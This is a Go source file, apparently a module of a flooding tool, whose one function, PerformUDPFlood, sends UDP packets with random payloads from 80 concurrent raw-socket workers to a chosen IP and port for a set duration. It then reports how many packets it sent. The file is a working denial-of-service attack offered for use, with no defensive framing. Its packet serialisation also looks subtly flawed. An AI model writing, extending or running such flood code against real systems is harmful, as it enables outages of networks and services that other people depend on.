package attacks

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

func PerformUDPFlood(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())

	// Resolve target IP address
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}

	// Create a context with cancellation to signal the end of the attack
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	// Launch multiple goroutines to send UDP packets concurrently
	numWorkers := 80 // Number of concurrent workers (adjust based on device capability)
	var wg sync.WaitGroup
	var packetCount int64 // Use int64 for atomic operations

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			// Create a raw socket (AF_INET, SOCK_RAW, IPPROTO_UDP)
			conn, err := net.ListenPacket("ip4:udp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return // Terminate goroutine if context is canceled
				default:
					// Prepare UDP packet
					udpLayer := &layers.UDP{
						SrcPort: layers.UDPPort(rand.Intn(65535)), // Randomize source port
						DstPort: layers.UDPPort(targetPort),
					}

					// Create a random payload of appropriate length (e.g., 16 bytes)
					payloadSize := 16
					payload := make([]byte, payloadSize)
					rand.Read(payload)

					// Serialize UDP layer with payload
					buffer := gopacket.NewSerializeBuffer()
					opts := gopacket.SerializeOptions{}
					if err := udpLayer.SerializeTo(buffer, opts); err != nil {
						fmt.Printf("Error serializing UDP layer: %v\n", err)
						continue
					}
					if err := gopacket.SerializeLayers(buffer, opts, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error serializing payload: %v\n", err)
						continue
					}

					// Send the raw packet (UDP) to the target
					if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}

					atomic.AddInt64(&packetCount, 1) // Increment packet count atomically
				}
			}
		}()
	}

	// Wait for all goroutines to finish or until the context is canceled
	wg.Wait()

	fmt.Printf("UDP flood attack completed. Sent %d packets.\n", atomic.LoadInt64(&packetCount))
	return nil
}